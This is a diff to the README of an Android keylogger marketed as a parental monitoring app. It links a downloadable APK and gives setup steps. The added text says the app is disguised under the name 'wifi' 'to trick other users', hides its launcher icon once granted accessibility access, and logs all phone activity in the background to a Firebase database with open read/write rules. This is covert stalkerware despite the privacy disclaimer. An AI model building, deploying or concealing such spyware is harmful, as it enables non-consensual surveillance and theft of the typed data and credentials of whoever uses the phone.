@@ -1,19 +1,26 @@
 # Android Keylogger for Children
 
-[![ss ak-45](https://raw.githubusercontent.com/CreatorB/ak-45/main/showcase/ss.png)](https://raw.githubusercontent.com/CreatorB/ak-45/main/showcase/app-debug.apk "childs app")
+[![ss ak-45](https://raw.githubusercontent.com/CreatorB/ak-45/main/showcase/ss-ak45-log.png)](https://raw.githubusercontent.com/CreatorB/ak-45/main/showcase/app-debug.apk "childs app")
 
 It is crucial to emphasize that such an application should be used with the utmost respect for the child's privacy and autonomy. The primary goal is to protect and educate children about the safe use of technology, not to breach trust or invade privacy unnecessarily. Parents are encouraged to use it app as a tool for dialogue and education, rather than solely as a surveillance device.
 
 ## Getting Started
 
-- Need setup firebase rule to allow read and write, and enable [Realtime Database](https://firebase.google.com/docs/database/android/start) feature.
-- [Childs](https://github.com/CreatorB/ak-45) - Main branch is app for children, no shortcut for launch app because it will run in background and have been mocked name called as 'wifi', you need enable [Accessibility](https://support.google.com/accessibility/android/answer/9078941) for this app on your child smartphone and scroll down find app called wifi and allow it accessibility.
-- [Parents](https://github.com/CreatorB/ak-45/tree/parents) - Parents branch is app for parents, you can read all log from your children's smartphone. 
+[![ss ak-45](https://raw.githubusercontent.com/CreatorB/ak-45/main/showcase/ss-ak45-firebase-login.png)]
+
+- Need enabled firebase [Realtime Database](https://firebase.google.com/docs/database/android/start) feature, allow read write rule, create parent = login with child = username, password both of key and value. 
+- Press wifi turbo at login page to enable accessibility feature for this app, you can check [How to enable Accessbility](https://support.google.com/accessibility/android/answer/9078941), scroll down find app called wifi and allow it accessibility.
+- if accessibility enabled the shortcut for launch app will hidden, App will run in background and ready to log all smartphone activities.
+- You can install in another phone and use login area feature to monitor all recorded activities.
+- This app name have been mocked as 'wifi' to trick other users.
 
 ## Features
 
-- [Parents] List children's activity 
-- [Parents] Delete button for delete all firebase logs
+- Login prompt to access logs.
+- Switch button to easily access accessibility settings.
+- App icon launcher will hidden if accessibility for this app enabled.
+- List smartphone activity logs.
+- Delete button for delete all firebase logs.
 
 ## Contribution
 
